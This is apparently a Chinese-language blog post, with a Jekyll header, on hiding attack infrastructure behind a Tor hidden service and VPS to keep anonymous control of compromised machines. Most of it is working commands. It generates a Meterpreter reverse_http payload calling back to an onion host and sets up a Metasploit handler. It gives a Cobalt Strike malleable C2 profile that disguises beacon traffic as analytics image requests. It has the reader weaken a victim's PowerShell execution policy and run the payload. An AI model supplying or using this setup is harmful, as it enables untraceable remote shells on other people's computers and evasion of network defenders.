---
layout:         post
title:          Tor Hidden Service & 匿名攻击
author:         wooy0ung
tags:           msf
category:  	exploit
password:       yes
---


>利用 VPS 作为跳板强化可持续控制, 但还是会泄漏一部分个人信息。  
>Tor Hidden Services 提供了隐藏自身网络的服务, 它提供了一个唯一并且匿名的 hostname, 配合 VPS 进行流量转发, 最终实现匿名持续控制。  
![](/assets/img/exploit/2017-09-03-tor-fronting/0x00.png)
<!-- more -->


### 0x00 config Tor Hidden Services

查看系统版本

```
$ lsb_release -a
```

![](/assets/img/exploit/2017-09-03-tor-fronting/0x01.png)

选择对应的版本, [传送门](https://www.torproject.org/docs/debian.html.en#ubuntu)

![](/assets/img/exploit/2017-09-03-tor-fronting/0x02.png)

按提示要求安装, 然后编辑 /etc/tor/torrc 文件(取消注释)

```
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
```

重启 Tor 服务

```
$ sudo service tor restart
```


### 0x01 开启 http 服务

查看 hostname

```
$ sudo cat /var/lib/tor/hidden_service/hostname
```

打开 http 服务

```
$ cd /tmp
$ python -m SimpleHTTPServer 8080
```

浏览器访问 xxx.onion.link, 确认页面能正常打开再关闭服务


### 0x02 payload & exploit

端口转发

```
$ ssh -N -R 8080:192.168.1.104:8080 root@VPS_IP
```

生成 http 反弹后门

```
$ msfvenom -p windows/meterpreter/reverse_http lhost=xxx.onion.link lport=80 -f exe > shell.exe
```

设置好 msf

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_http
msf exploit(handler) > set lhost 0.0.0.0
msf exploit(handler) > set lport 8080
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j
```

在 Victim's machine 执行 payload, getshell~

![](/assets/img/exploit/2017-09-03-tor-fronting/0x03.png)


### 0x03 cobaltstrike

将 teamserver、cobaltstrike.jar上传到 vps, 在 vps nano tor-fronting.profile 文件, 添加以下内容

```
set sleeptime "5000";
http-get {
        set uri "/___utm";
        client {
                header "Host" "xxx.onion.link";
                header "Cookie" "onion_cab_iKnowShit=xxx";
                metadata {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }
        server {
                header "Content-Type" "plain/text";
                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}
http-post {
        set uri "/__utm";
        set verb "GET";
        client {
                header "Host" "xxx.onion.link";
                header "Cookie" "onion_cab_iKnowShit=xxx";
                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }
                output {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }
        server {
                header "Content-Type" "plain/text";
                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}
# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "plain/text";
        }
}
```

打开 teamserver

```
$ ./teamserver VPS_IP msf tor-fronting.profile
```

连接 teamserver

```
$ ./cobaltstrike
```

![](/assets/img/exploit/2017-09-03-tor-fronting/0x04.png)

新建 listener

![](/assets/img/exploit/2017-09-03-tor-fronting/0x05.png)
![](/assets/img/exploit/2017-09-03-tor-fronting/0x06.png)

生成 payload

![](/assets/img/exploit/2017-09-03-tor-fronting/0x07.png)

在 Victim's machine 的 powreshell 下执行以下命令, 允许执行不信任脚本

```
> set-ExecutionPolicy RemoteSigned
```

再执行 payload, getshell~

![](/assets/img/exploit/2017-09-03-tor-fronting/0x08.png)